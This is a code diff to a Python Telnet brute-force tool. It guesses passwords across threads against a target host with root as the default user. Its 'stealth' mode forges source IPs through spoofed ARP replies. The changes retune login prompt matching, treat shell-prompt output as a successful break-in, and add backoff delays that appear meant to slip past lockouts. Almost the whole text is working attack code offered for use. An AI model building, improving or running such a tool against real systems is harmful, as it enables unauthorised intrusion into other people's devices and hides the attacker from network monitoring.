@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Telnet Brute Force Tool with ARP‑backed Stealth Mode
+# Telnet Brute Force Tool with ARP-backed Stealth Mode
 
 import argparse
 import threading
@@ -17,15 +17,15 @@ GREEN  = "\033[38;2;0;255;0m"
 RESET  = "\033[0m"
 BOLD   = "\033[1m"
 
-stopAttack    = threading.Event()
+stopAttack    = False
 attemptsDone  = 0
 startTime     = 0
-lock          = threading.Lock()
-successFound  = None
+lock = threading.Lock()
 
 def SignalHandler(sig, frame):
+    global stopAttack
     print(f"\n{RED}Stopping brute force...{RESET}")
-    stopAttack.set()
+    stopAttack = True
     sys.exit(0)
 
 def FormatDuration(seconds):
@@ -34,7 +34,7 @@ def FormatDuration(seconds):
     return f"{hrs:02}:{mins:02}:{secs:02}"
 
 def PrintProgress(total):
-    while not stopAttack.is_set():
+    while not stopAttack:
         elapsed = time.time() - startTime
         with lock:
             print(f"\r{RED}Attempts: {attemptsDone}/{total} | Duration: {FormatDuration(elapsed)}{RESET}", end="")
@@ -52,21 +52,21 @@ def AttemptLogin(host, port, username, password, sourceIp=None):
         sock.connect((host, port))
         tn = Telnet()
         tn.sock = sock
-        tn.read_until(b"login: ", timeout=3)
+
+        # Adjusted prompts to match your server
+        tn.read_until(b"User: ", timeout=5)
         tn.write(username.encode() + b"\n")
-        tn.read_until(b"Password: ", timeout=3)
+        tn.read_until(b"Password: ", timeout=5)
         tn.write(password.encode() + b"\n")
-        time.sleep(2)  # give it time to process login
-
-        # Try reading some output (might be empty)
+        time.sleep(1)
         out = tn.read_very_eager().decode(errors="ignore")
-        # If we don’t get "login incorrect" or disconnected, consider it success
-        if "incorrect" in out.lower() or "failed" in out.lower() or "login" in out.lower():
-            return False
+        tn.close()
 
-        # Still connected = likely success
-        return True
-    except Exception:
+        if any(indicator in out for indicator in ["[root@", "#", "$", ">"]):
+            print(f"\n{GREEN}[+] Output after login attempt:{RESET}\n{out}")
+            return True
+        return False
+    except Exception as e:
         return False
     finally:
         sock.close()
@@ -75,47 +75,62 @@ def ArpSpoofOnce(targetIp, fakeIp, iface):
     pkt = ARP(op=2, pdst=targetIp, psrc=fakeIp, hwdst="ff:ff:ff:ff:ff:ff")
     send(pkt, iface=iface, verbose=False)
 
-def Worker(host, port, username, passwords, mode, subnetPrefix, iface, delay):
-    global attemptsDone, successFound
+def WorkerNormal(host, port, username, passwords, delay):
+    global attemptsDone, stopAttack
+    failCount = 0
     for pwd in passwords:
-        if stopAttack.is_set():
+        if stopAttack:
             break
-
-        if mode == "stealth":
-            fakeIp = f"{subnetPrefix}.{random.randint(2, 254)}"
-            ArpSpoofOnce(host, fakeIp, iface)
-            result = AttemptLogin(host, port, username, pwd, sourceIp=fakeIp)
-        else:
-            result = AttemptLogin(host, port, username, pwd)
-
+        if AttemptLogin(host, port, username, pwd):
+            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
+            stopAttack = True
+            break
         with lock:
             attemptsDone += 1
+        failCount += 1
+        time.sleep(delay)
+        if failCount >= 5:
+            time.sleep(delay * 10)
+            delay = min(delay * 2, 30)
+            failCount = 0
 
-        if result:
-            with lock:
-                if not successFound:
-                    successFound = (username, pwd)
-                    print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
-                    stopAttack.set()
+def WorkerStealth(host, port, username, passwords, subnetPrefix, iface, delay):
+    global attemptsDone, stopAttack
+    for pwd in passwords:
+        if stopAttack:
             break
-
+        fakeIp = f"{subnetPrefix}.{random.randint(2,254)}"
+        ArpSpoofOnce(host, fakeIp, iface)
+        if AttemptLogin(host, port, username, pwd, sourceIp=fakeIp):
+            print(f"\n{GREEN}Success: {username}:{pwd}{RESET}")
+            stopAttack = True
+            break
+        with lock:
+            attemptsDone += 1
         time.sleep(delay)
 
 def StartAttack(host, port, username, passwords, mode, subnetPrefix, iface, threadsCount, delay):
-    global startTime, attemptsDone, successFound
+    global startTime, attemptsDone
     startTime = time.time()
     attemptsDone = 0
-    successFound = None
-
     total = len(passwords)
-    progressThread = threading.Thread(target=PrintProgress, args=(total,), daemon=True)
-    progressThread.start()
+
+    prog = threading.Thread(target=PrintProgress, args=(total,), daemon=True)
+    prog.start()
 
     slices = [passwords[i::threadsCount] for i in range(threadsCount)]
     threads = []
-
-    for slice_ in slices:
-        t = threading.Thread(target=Worker, args=(host, port, username, slice_, mode, subnetPrefix, iface, delay))
+    for i in range(threadsCount):
+        if mode == "stealth":
+            t = threading.Thread(
+                target=WorkerStealth,
+                args=(host, port, username, slices[i], subnetPrefix, iface, delay)
+            )
+        else:
+            t = threading.Thread(
+                target=WorkerNormal,
+                args=(host, port, username, slices[i], delay)
+            )
         t.start()
         threads.append(t)
 
@@ -148,14 +163,14 @@ def menu():
 
 def terminal():
     parser = argparse.ArgumentParser(description="Telnet Brute Force Tool")
-    parser.add_argument("-i", "--host",     required=True, help="Target IP")
-    parser.add_argument("-P", "--port",     type=int, default=23, help="Telnet port")
-    parser.add_argument("-u", "--username", default="root", help="Login username")
-    parser.add_argument("-m", "--mode",     choices=["normal", "stealth"], default="normal", help="Mode")
-    parser.add_argument("--subnet",         help="Subnet prefix (e.g. 192.168.1) for stealth")
-    parser.add_argument("--iface",          help="Interface (e.g. eth0) for stealth")
-    parser.add_argument("-t", "--threads",  type=int, default=10, help="Number of threads")
-    parser.add_argument("-d", "--delay",    type=float, default=1.0, help="Delay between attempts (s)")
+    parser.add_argument("-i","--host",    required=True, help="Target IP")
+    parser.add_argument("-P","--port",    type=int, default=23, help="Telnet port")
+    parser.add_argument("-u","--username",default="root", help="Login username")
+    parser.add_argument("-m","--mode",    choices=["normal","stealth"], default="normal", help="Mode")
+    parser.add_argument("--subnet",       help="Subnet prefix (e.g. 192.168.1) for stealth")
+    parser.add_argument("--iface",        help="Interface (e.g. eth0) for stealth")
+    parser.add_argument("-t","--threads", type=int, default=10, help="Number of threads")
+    parser.add_argument("-d","--delay",   type=float, default=1.0, help="Delay between attempts (s)")
     args = parser.parse_args()
 
     wordlist = os.path.join(os.path.dirname(__file__), "passwords.txt")
